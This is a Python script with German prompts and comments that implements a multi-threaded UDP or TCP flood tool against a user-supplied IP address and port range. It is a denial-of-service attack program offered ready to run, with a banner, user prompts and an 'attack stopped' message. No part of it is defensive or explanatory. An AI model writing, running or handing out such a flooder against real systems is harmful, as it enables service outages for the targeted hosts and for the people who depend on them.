import os
import random
import socket
import threading
import sys
import time

# Globale Variablen
stop_event = threading.Event()

# Banner mit Anpassungsmöglichkeiten
def show_banner():
    os.system("clear")
    sys.stdout.write("""
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██████╔╝██████╔╝██║   ██║█████╗  
██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
██║     ██║     ╚██████╔╝███████╗
╚═╝     ╚═╝      ╚═════╝ ╚══════╝
    """)
    sys.stdout.flush()

# UDP Flood
def udp_flood(ip, ports, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(packet_size)
    sent = 0
    port_index = 0
    while not stop_event.is_set():
        try:
            port = ports[port_index]
            sock.sendto(udp_bytes, (ip, port))
            sent += 1
            port_index = (port_index + 1) % len(ports)
            sys.stdout.write(f"\rGesendet {sent} Bytes an {ip} über Port {port}")
            sys.stdout.flush()
            time.sleep(0.001)  # Update alle 0,001 Sekunden
        except:
            pass

# TCP Flood
def tcp_flood(ip, ports, packet_size):
    sent = 0
    port_index = 0
    while not stop_event.is_set():
        try:
            port = ports[port_index]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(random._urandom(packet_size))
            sent += 1
            port_index = (port_index + 1) % len(ports)
            sys.stdout.write(f"\rGesendet {sent} Bytes an {ip} über Port {port}")
            sys.stdout.flush()
            time.sleep(0.001)  # Update alle 0,001 Sekunden
        except:
            pass
        finally:
            sock.close()

# Hauptprogramm
if __name__ == "__main__":
    show_banner()

    ip = input("Ziel-IP-Adresse: ")
    port = int(input("Ziel-Port (-1 für alle Ports): "))
    packet_size = int(input("Paketgröße in Bytes: "))
    num_threads = int(input("Anzahl der Threads: "))

    if port == -1:
        ports = list(range(1, 65535))
    else:
        ports = [port]

    attack_type = input("Wählen Sie 'udp' oder 'tcp': ").lower()
    attack_function = udp_flood if attack_type == "udp" else tcp_flood

    stop_event.clear()
    threads = [
        threading.Thread(target=attack_function, args=(ip, ports, packet_size))
        for _ in range(num_threads)
    ]
    for thread in threads:
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        stop_event.set()
        sys.stdout.write("\nAngriff gestoppt.\n")